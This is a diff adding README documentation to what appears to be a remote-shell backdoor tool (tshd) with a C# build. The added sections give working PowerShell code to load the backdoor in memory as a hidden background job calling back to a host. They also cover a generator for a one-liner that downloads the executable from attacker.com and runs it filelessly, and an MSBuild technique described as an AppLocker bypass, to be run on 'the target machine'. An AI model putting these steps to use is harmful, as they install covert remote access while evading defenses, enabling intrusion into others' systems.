@@ -139,6 +139,60 @@ $args = [string[]] @("-c", "192.168.1.100", "-p", "1234", "-s", "1234")
 $entryPoint.Invoke($null, [object[]] @(,$args))
 ```
 
+#### Run in background (PowerShell)
+
+To run in the background without blocking the shell (using a Job):
+
+```powershell
+$bytes = [System.IO.File]::ReadAllBytes("tshd.exe")
+# Arguments: -c <host> -p <port> -s <secret>
+$tshdArgs = [string[]] @("-c", "192.168.1.100", "-p", "1234", "-s", "1234")
+
+Start-Job -ScriptBlock {
+    param($bytes, $args)
+    # Load assembly in the job process
+    $assembly = [System.Reflection.Assembly]::Load($bytes)
+    # Invoke Main
+    $assembly.EntryPoint.Invoke($null, [object[]] @(,$args))
+} -ArgumentList $bytes, $tshdArgs
+```
+
+#### Generate PowerShell Loader Script
+
+You can use the `tshd-ps.py` helper script to generate a PowerShell one-liner that downloads (or reads) and executes `tshd.exe` in memory, in a hidden background process.
+
+Usage:
+
+```bash
+python3 tshd-ps.py -c <host> -p <port> -s <secret> -pe <url_or_path_to_exe>
+```
+
+Example:
+
+```bash
+python3 tshd-ps.py -c 192.168.1.100 -p 1234 -s mysecret -pe http://attacker.com/tshd.exe
+```
+
+This will output a PowerShell command that you can run on the target machine. It handles downloading the executable into memory and running it without touching the disk.
+
+
+#### Execute using MSBuild (Fileless / AppLocker Bypass)
+
+You can run the C# version "filelessly" by embedding it into an MSBuild XML project file. This compiles and executes the C# code in memory using the trusted `MSBuild.exe` binary.
+
+1. Generate the loader XML:
+
+```bash
+python3 tshd-msbuild.py -c 192.168.1.100 -p 1234 -s mysecret -o build/tshd_loader.xml
+```
+
+2. Run on the target machine (requires .NET Framework 4.0+):
+
+```cmd
+cmd /c start C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c:\tshd_loader.xml
+```
+
+
 ### How to use the tsh (client)
 
 #### Help
